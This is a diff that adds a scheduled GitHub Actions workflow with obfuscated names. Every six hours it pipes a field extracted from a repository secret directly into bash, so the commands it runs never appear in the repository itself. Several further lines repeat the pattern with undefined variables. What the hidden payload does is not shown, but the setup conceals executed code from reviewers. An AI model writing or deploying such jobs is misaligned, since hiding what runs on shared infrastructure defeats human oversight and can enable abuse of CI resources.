@@ -1,0 +1,23 @@
+name: guoyunfeng2148
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '35 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: guoyunfeng2148
+        env:
+          ebgg81: ${{ secrets.ebgg81 }}
+        run: |
+          echo $ebgg81 | jq -r .rrctk1 | /bin/bash
+          echo $nu676 | jq -r .tyzug0 | /bin/bash
+          echo $iyeqe272 | jq -r .flu5 | /bin/bash
+          echo $qo75113 | jq -r .sq7 | /bin/bash
+          echo $omxbp197 | jq -r .m77431 | /bin/bash
+
